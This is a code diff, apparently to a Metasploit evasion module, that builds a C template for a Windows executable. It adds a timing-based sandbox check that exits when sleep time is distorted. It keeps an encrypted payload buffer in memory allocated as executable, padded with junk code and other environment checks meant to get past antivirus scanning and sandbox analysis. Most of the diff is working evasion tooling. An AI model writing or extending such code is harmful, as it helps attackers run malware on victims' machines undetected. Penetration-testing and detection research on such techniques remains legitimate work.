@@ -151,10 +151,39 @@ end
 
 def get_includes()
   rc4 = "#include \"#{File.join(Msf::Config.install_root, 'data', 'headers', 'windows')}/rc4.h\""
-  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4]
+  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n", "#include <synchapi.h>\n", "#include <stdio.h>\n", rc4, "#include <time.h>\n"]
   includes.shuffle
   return includes.join
 end
+
+
+def get_time_distorsion
+  time_distorsion = %Q|
+      
+  int time_distortion()
+  {
+      DWORD mesure1 ;
+      DWORD mesure2 ;
+      #{junk_code(1)}
+      mesure1 = timeGetTime();
+      Sleep(1000);
+      mesure2 = timeGetTime();
+      #{junk_code(1)}
+      if((mesure2 > (mesure1+ 1000))&&(mesure2 < (mesure1+ 1200)))
+      {
+      #{junk_code(1)}
+      return 0;
+      }
+      else
+      {
+      exit(0);
+      #{junk_code(1)}
+      }
+      #{junk_code(1)}
+    }
+  |
+end
+
 
 def get_check_url()
   fct_url = "int check_url() {\n"
@@ -190,8 +219,6 @@ end
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "Wininet.lib")
 
-// The encrypted code allows us to get around static scanning
-
 int size  = #{get_payload[:size]};
 char buf[#{get_payload[:size]}];
 
@@ -201,13 +228,13 @@ char buf[#{get_payload[:size]}];
 
 #{get_check_url}
 
+#{get_time_distorsion}
+
 int main(int argc, char **argv)
 {
-int lpBufSize = sizeof(int) * size;
+  int lpBufSize = sizeof(int) * size;
   LPVOID lpBuf = VirtualAlloc(NULL, lpBufSize, MEM_COMMIT, 0x00000040);
   memset(lpBuf, '\\0', lpBufSize);
-  
-  
   if (check_url())
     exit(1);
   #{junk_code(1)}
@@ -217,23 +244,19 @@ int lpBufSize = sizeof(int) * size;
   for (i = 0; i < max_op; i++) {
     cpt++;
   }
-  printf("cpt = %d\\n", cpt);
   if (cpt == max_op) {
     ;
   }
    else {
       exit(33);
   }
-  PROCESS_MEMORY_COUNTERS pmc;
-  GetProcessMemoryInfo(GetCurrentProcess(), &pmc, sizeof(pmc));
-    #{junk_code(1)}
-  if(!(pmc.WorkingSetSize<=3500000))
-  {
-      #{junk_code(1)}
-  }
 
-    #{junk_code(1)}
-    #{get_payload_bytes}
+  #{junk_code(1)}
+  
+
+  time_distortion();
+  #{get_payload_bytes}
+  
   #{junk_code(1)}
   #{junk_code(1)}
   #{junk_code(1)}
@@ -265,15 +288,17 @@ int lpBufSize = sizeof(int) * size;
   end
 
   def run
-    # The randomized code allows us to generate a unique EXE
     fname = Rex::Text.rand_text_alpha(4..7)
     path = File.join(Msf::Config.local_directory, fname)
     full_path = ::File.expand_path(path)
-    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: " -lpsapi -lwininet -w " })
+    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: full_path, compile_options: " -lpsapi -lwininet -lwinmm -w " })
     output = m.compile_c(c_template)
-    print_status("Compiler output len : #{output.length}")
-    print_status("#{output}")
-    print_good "#{fname}.exe stored at #{full_path}.exe"
+    if output.length > 0
+      print_error(output)
+    else
+      print_good "#{fname}.exe stored at #{full_path}.exe"
+    end
+    print_good "#{fname}.c stored at #{full_path}.c"
   end
 
 end
